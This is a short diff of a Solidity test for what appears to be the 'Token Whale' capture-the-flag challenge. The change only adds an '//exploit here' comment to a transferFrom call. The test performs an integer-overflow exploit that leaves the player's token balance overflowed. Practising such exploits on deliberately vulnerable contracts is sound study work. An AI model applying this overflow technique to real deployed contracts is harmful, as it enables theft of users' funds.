@@ -18,7 +18,7 @@ function testOverflow2() public {
 
     vm.prank(alice);   
     TokenWhaleChallengeContract.approve(address(this),1000);
-    TokenWhaleChallengeContract.transferFrom(address(alice),address(bob),500);
+    TokenWhaleChallengeContract.transferFrom(address(alice),address(bob),500); //exploit here
 
     console.log("Exploit completed, balance overflowed");
     console.log("Player balance:",TokenWhaleChallengeContract.balanceOf(address(this)));
